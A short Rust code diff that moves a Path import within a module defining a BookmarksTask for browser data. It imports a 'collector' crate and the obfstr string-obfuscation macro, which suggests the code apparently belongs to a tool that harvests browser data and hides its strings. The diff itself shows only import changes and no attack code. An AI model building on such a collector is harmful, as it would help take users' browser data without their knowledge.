@@ -5,12 +5,12 @@ use alloc::sync::Arc;
 use alloc::vec;
 use alloc::vec::Vec;
 use collector::{Browser, Collector};
+use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::FileSystem;
 use json::{parse, Value};
 use obfstr::obfstr as s;
 use tasks::{parent_name, Task};
-use utils::path::Path;
 
 pub(super) struct BookmarksTask {
     browser: Arc<BrowserData>,
